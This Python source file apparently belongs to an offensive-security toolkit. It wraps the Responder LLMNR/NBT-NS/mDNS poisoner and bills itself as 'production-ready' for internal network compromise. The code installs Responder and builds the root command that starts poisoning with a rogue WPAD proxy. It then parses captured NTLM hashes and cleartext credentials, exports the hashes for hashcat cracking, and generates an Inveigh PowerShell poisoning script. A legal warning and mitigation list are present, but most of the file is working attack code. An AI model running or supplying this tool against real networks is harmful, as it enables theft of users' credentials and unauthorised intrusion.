#!/usr/bin/env python3
"""
Responder - LLMNR/NBT-NS/mDNS Poisoner
Network credential capture through poisoning attacks
Production-ready tool for internal network compromise
"""

import subprocess
import json
import logging
import argparse
import os
import sys
import re
from pathlib import Path
from typing import Dict, List, Optional
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class ResponderPoisoner:
    """
    Responder integration for LLMNR/NBT-NS/mDNS poisoning
    Captures NTLM hashes and credentials from network traffic
    """
    
    def __init__(self, responder_dir: Optional[str] = None):
        self.responder_dir = responder_dir or '/usr/share/responder'
        self.logs_dir = Path(self.responder_dir) / 'logs'
        
    def check_installation(self) -> bool:
        """Check if Responder is installed"""
        # Check common locations
        responder_locations = [
            '/usr/share/responder/Responder.py',
            '/opt/Responder/Responder.py',
            str(Path.home() / 'Responder/Responder.py')
        ]
        
        for location in responder_locations:
            if os.path.exists(location):
                self.responder_dir = str(Path(location).parent)
                logger.info(f"Responder found at: {location}")
                return True
        
        # Check if in PATH
        try:
            result = subprocess.run(['responder', '-h'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                logger.info("Responder is installed")
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        
        logger.error("Responder not installed")
        return False
    
    def install_responder(self) -> bool:
        """Install Responder from GitHub"""
        logger.info("Installing Responder...")
        
        install_dir = Path.home() / 'Responder'
        
        try:
            if install_dir.exists():
                logger.info("Updating Responder...")
                subprocess.run(['git', 'pull'], cwd=install_dir, 
                             check=True, timeout=60)
            else:
                logger.info("Cloning Responder repository...")
                subprocess.run([
                    'git', 'clone',
                    'https://github.com/lgandx/Responder.git',
                    str(install_dir)
                ], check=True, timeout=120)
            
            self.responder_dir = str(install_dir)
            self.logs_dir = install_dir / 'logs'
            
            logger.info("Responder installed successfully!")
            logger.info("Note: Run with sudo for network poisoning")
            
            return True
            
        except subprocess.CalledProcessError as e:
            logger.error(f"Installation failed: {e}")
            return False
        except Exception as e:
            logger.error(f"Error: {e}")
            return False
    
    def start_poisoning(self, interface: str, analyze: bool = False,
                       wpad: bool = True, fingerprint: bool = False,
                       force_wpad_auth: bool = False) -> Dict:
        """
        Start Responder poisoning attack
        
        Args:
            interface: Network interface (e.g., eth0, wlan0)
            analyze: Analyze mode (no poisoning, just monitor)
            wpad: Enable WPAD rogue proxy
            fingerprint: Fingerprint hosts
            force_wpad_auth: Force WPAD authentication
        """
        if not self.check_installation():
            return {"error": "Responder not installed"}
        
        responder_script = Path(self.responder_dir) / 'Responder.py'
        
        cmd = [
            'sudo', 'python3', str(responder_script),
            '-I', interface
        ]
        
        if analyze:
            cmd.append('-A')
            logger.info("Running in analyze mode (no poisoning)")
        
        if wpad:
            cmd.append('-w')
        
        if fingerprint:
            cmd.append('-f')
        
        if force_wpad_auth:
            cmd.append('-F')
        
        logger.info(f"Starting Responder on interface {interface}...")
        logger.warning("⚠️  This will poison network traffic!")
        logger.warning("⚠️  Requires sudo/root privileges")
        logger.info(f"Command: {' '.join(cmd)}")
        
        return {
            'status': 'started',
            'interface': interface,
            'command': ' '.join(cmd),
            'logs_dir': str(self.logs_dir),
            'note': 'Run the command manually with sudo. Press Ctrl+C to stop.'
        }
    
    def parse_ntlm_hashes(self, log_dir: Optional[str] = None) -> List[Dict]:
        """
        Parse captured NTLM hashes from Responder logs
        
        Returns list of captured credentials
        """
        if log_dir:
            logs_path = Path(log_dir)
        else:
            logs_path = self.logs_dir
        
        if not logs_path.exists():
            logger.error(f"Logs directory not found: {logs_path}")
            return []
        
        captured_hashes = []
        
        # Parse HTTP/SMB NTLMv1/v2 logs
        for log_file in logs_path.glob('*NTLMv*.txt'):
            try:
                with open(log_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if '::' in line:
                            # Parse NTLM hash format
                            parts = line.split('::')
                            if len(parts) >= 5:
                                captured_hashes.append({
                                    'username': parts[0],
                                    'domain': parts[1] if parts[1] else 'WORKGROUP',
                                    'hash': line,
                                    'hash_type': 'NTLMv2' if 'NTLMv2' in log_file.name else 'NTLMv1',
                                    'protocol': self._extract_protocol(log_file.name),
                                    'source_file': log_file.name
                                })
            except Exception as e:
                logger.debug(f"Error parsing {log_file}: {e}")
        
        return captured_hashes
    
    def _extract_protocol(self, filename: str) -> str:
        """Extract protocol from log filename"""
        if 'HTTP' in filename:
            return 'HTTP'
        elif 'SMB' in filename:
            return 'SMB'
        elif 'LDAP' in filename:
            return 'LDAP'
        elif 'MSSQL' in filename:
            return 'MSSQL'
        else:
            return 'Unknown'
    
    def parse_cleartext_creds(self, log_dir: Optional[str] = None) -> List[Dict]:
        """Parse cleartext credentials from logs"""
        if log_dir:
            logs_path = Path(log_dir)
        else:
            logs_path = self.logs_dir
        
        if not logs_path.exists():
            return []
        
        cleartext = []
        
        # Parse cleartext credential files
        for log_file in logs_path.glob('*-Clear*.txt'):
            try:
                with open(log_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            cleartext.append({
                                'credential': line,
                                'protocol': self._extract_protocol(log_file.name),
                                'source_file': log_file.name
                            })
            except Exception as e:
                logger.debug(f"Error parsing {log_file}: {e}")
        
        return cleartext
    
    def export_to_hashcat(self, hashes: List[Dict], output_file: str) -> bool:
        """
        Export NTLM hashes in Hashcat format
        
        Mode 5600 for NTLMv2
        """
        try:
            with open(output_file, 'w') as f:
                for hash_entry in hashes:
                    f.write(hash_entry['hash'] + '\n')
            
            logger.info(f"Hashes exported to: {output_file}")
            logger.info("Crack with: hashcat -m 5600 hashes.txt wordlist.txt")
            
            return True
            
        except Exception as e:
            logger.error(f"Error exporting hashes: {e}")
            return False
    
    def generate_report(self, hashes: List[Dict], cleartext: List[Dict],
                       output_file: str) -> Dict:
        """Generate comprehensive capture report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'tool': 'Responder LLMNR/NBT-NS Poisoner',
            'summary': {
                'total_hashes': len(hashes),
                'ntlmv2': len([h for h in hashes if h['hash_type'] == 'NTLMv2']),
                'ntlmv1': len([h for h in hashes if h['hash_type'] == 'NTLMv1']),
                'cleartext_creds': len(cleartext),
                'unique_users': len(set([h['username'] for h in hashes])),
                'protocols': list(set([h['protocol'] for h in hashes]))
            },
            'captured_hashes': hashes,
            'cleartext_credentials': cleartext,
            'recommendations': [
                'Disable LLMNR and NBT-NS on Windows hosts',
                'Implement SMB signing on all systems',
                'Use Kerberos authentication instead of NTLM',
                'Enable network segmentation',
                'Monitor for Responder-like activity (multicast traffic)'
            ]
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"Report saved to: {output_file}")
        
        return report


class InveighPoisoner:
    """
    Alternative: Inveigh (PowerShell/C# Responder alternative for Windows)
    """
    
    def __init__(self):
        pass
    
    def generate_powershell_script(self, interface_ip: str) -> str:
        """Generate Inveigh PowerShell command"""
        script = f"""# Inveigh LLMNR/NBNS Poisoner (Windows)
# Requires PowerShell with admin rights

# Install Inveigh
# Install-Module -Name Inveigh -Force

# Import module
Import-Module Inveigh

# Start poisoning
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -IP {interface_ip} -RunTime 3600

# View captured credentials
Get-Inveigh -Console

# Clear captured data
Clear-Inveigh

# Stop Inveigh
Stop-Inveigh
"""
        return script


def main():
    parser = argparse.ArgumentParser(description="Responder - Network Credential Poisoner")
    parser.add_argument('--install', action='store_true', help='Install Responder')
    parser.add_argument('--interface', '-I', help='Network interface to use')
    parser.add_argument('--analyze', '-A', action='store_true', 
                       help='Analyze mode (no poisoning)')
    parser.add_argument('--wpad', action='store_true', default=True,
                       help='Enable WPAD rogue proxy')
    parser.add_argument('--fingerprint', '-f', action='store_true',
                       help='Fingerprint hosts')
    parser.add_argument('--parse-logs', help='Parse logs from directory')
    parser.add_argument('--export-hashcat', help='Export hashes for Hashcat')
    parser.add_argument('--generate-report', help='Generate comprehensive report')
    
    args = parser.parse_args()
    
    responder = ResponderPoisoner()
    
    if args.install:
        responder.install_responder()
        return
    
    if args.parse_logs:
        logger.info(f"Parsing logs from: {args.parse_logs}")
        
        hashes = responder.parse_ntlm_hashes(args.parse_logs)
        cleartext = responder.parse_cleartext_creds(args.parse_logs)
        
        print(f"\n{'='*80}")
        print("CAPTURED CREDENTIALS")
        print(f"{'='*80}\n")
        
        print(f"NTLM Hashes: {len(hashes)}")
        for h in hashes:
            print(f"  [{h['protocol']}] {h['username']}@{h['domain']} ({h['hash_type']})")
        
        print(f"\nCleartext Credentials: {len(cleartext)}")
        for c in cleartext:
            print(f"  [{c['protocol']}] {c['credential'][:50]}...")
        
        if args.export_hashcat:
            responder.export_to_hashcat(hashes, args.export_hashcat)
        
        if args.generate_report:
            responder.generate_report(hashes, cleartext, args.generate_report)
        
        return
    
    if args.interface:
        result = responder.start_poisoning(
            args.interface,
            analyze=args.analyze,
            wpad=args.wpad,
            fingerprint=args.fingerprint
        )
        
        print(json.dumps(result, indent=2))
        print(f"\n🎯 Run the command manually:")
        print(f"   {result['command']}")
        print(f"\n📝 Logs will be saved to:")
        print(f"   {result['logs_dir']}")
        print(f"\n⏹  Stop with Ctrl+C")
        
        return
    
    print("\n🕸️  Responder - LLMNR/NBT-NS/mDNS Poisoner")
    print("\n⚠️  LEGAL WARNING:")
    print("  - Requires explicit network owner authorization")
    print("  - Network poisoning is a hostile action")
    print("  - Use only in authorized penetration tests")
    print("\n📥 Installation:")
    print("  python cerberus_agents/responder_llmnr.py --install")
    print("\n🚀 Usage:")
    print("  sudo python3 ~/Responder/Responder.py -I eth0 -wf")
    print("\n📚 Resources:")
    print("  https://github.com/lgandx/Responder")
    print("  https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/")


if __name__ == "__main__":
    main()
